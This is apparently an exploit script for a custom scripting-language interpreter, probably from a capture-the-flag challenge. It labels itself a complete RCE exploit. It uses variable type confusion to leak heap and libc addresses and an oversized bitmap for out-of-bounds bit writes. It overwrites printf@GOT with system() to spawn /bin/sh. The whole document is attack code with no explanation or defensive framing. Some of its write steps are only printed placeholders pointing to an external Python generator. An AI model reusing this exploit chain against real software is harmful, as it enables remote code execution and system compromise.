print("=== Complete RCE Exploit (Fixed) ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;
print("addr1:");
print(addr1);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 3: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 4: Create target variable");
int target = 0;
string target = "target";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 5: Calculate addresses");
int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
int bitmapptr = addr1 - 4096;
int offset = valueptraddr - bitmapptr;
int bitindex = offset * 8;
print("Calculated bit_index for value_ptr:");
print(bitindex);

print("Step 6: Write printf@GOT to value_ptr");
print("printf@GOT = 0x409048");
print("Writing 64 bits...");
print("Note: Use calculated bit_index, generated by Python");

print("Step 7: Verify corruption");
int verify = target;
print("Reading target (should be printf address):");
print(verify);

print("Step 8: Calculate system_addr");
int setvbufoffset = 558416;
int systemoffset = 362320;
int libcbase = leaked - setvbufoffset;
int systemaddr = libcbase + systemoffset;
print("system_addr:");
print(systemaddr);

print("Step 9: Write system_addr to corrupted value_ptr location");
print("Since value_ptr now points to printf@GOT,");
print("we write system_addr to the same location using bitmap");
print("This is the same address as value_ptr, so same bit_index!");
print("Writing system_addr (64 bits) to value_ptr location...");
print("Note: Use same bit_index, but write system_addr value");
print("Generated by: python3 rce_generate_write_code.py <bit_index> <system_addr>");

print("Step 10: Trigger shell");
print("print with /bin/sh");

